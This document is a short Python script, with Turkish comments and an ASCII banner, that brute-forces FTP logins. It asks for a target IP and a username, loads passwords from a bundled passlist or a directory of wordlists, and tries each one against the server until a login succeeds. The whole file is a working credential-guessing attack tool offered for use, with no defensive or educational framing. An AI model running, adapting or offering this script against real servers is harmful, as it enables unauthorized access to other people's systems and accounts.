import ftplib
import time
import os

# Terminali temizle
os.system("clear")

# ASCII banner
print(r"""
  ___                           
 | _ ) __ _ _ _  __ _ _ _  __ _ 
 | _ \/ _` | ' \/ _` | ' \/ _` |
 |___/\__,_|_||_\__,_|_||_\__,_|
                                  
""")

print("🔒 Target IP:")
target = input("> ")

print("👤 FTP username (leave blank for 'anonymous'):")
username = input("> ").strip()
if username == "":
    username = "anonymous"

print("Do you wanna use a ready-made passlist or your passlist? (y or n)")
use_ready = input("> ").lower()

passwords = []

if use_ready == "y":
    wordlist_path = "passlist.txt"
    if not os.path.isfile(wordlist_path):
        print(f"❌ File not found: {wordlist_path}")
        exit()
    with open(wordlist_path, "r", encoding="latin-1") as file:
        passwords = [line.strip() for line in file if line.strip()]
else:
    print("Enter your passlist directory (relative to current directory):")
    dir_path = input("> ").strip()
    if not os.path.isdir(dir_path):
        print(f"❌ Directory not found: {dir_path}")
        exit()
    # Dizin içindeki tüm dosyaları oku
    for filename in os.listdir(dir_path):
        file_path = os.path.join(dir_path, filename)
        if os.path.isfile(file_path):
            with open(file_path, "r", encoding="latin-1") as file:
                lines = [line.strip() for line in file if line.strip()]
                passwords.extend(lines)

if not passwords:
    print("❌ No passwords found to try.")
    exit()

os.system("clear")
print(f"\n🚀 Starting FTP brute-force on {target} as {username} with {len(passwords)} passwords...\n")

for password in passwords:
    print(f"🔍 Trying password: {password}")
    try:
        ftp = ftplib.FTP(target)
        ftp.login(user=username, passwd=password)
        print(f"\n✅ Success! Password found: {password}")
        ftp.quit()
        break
    except ftplib.error_perm:
        print("❌ Login failed")
    except Exception as e:
        print("⚠️ Error:", e)
        break
    time.sleep(0.1)

else:
    print("\n🔚 Done. No password matched.")
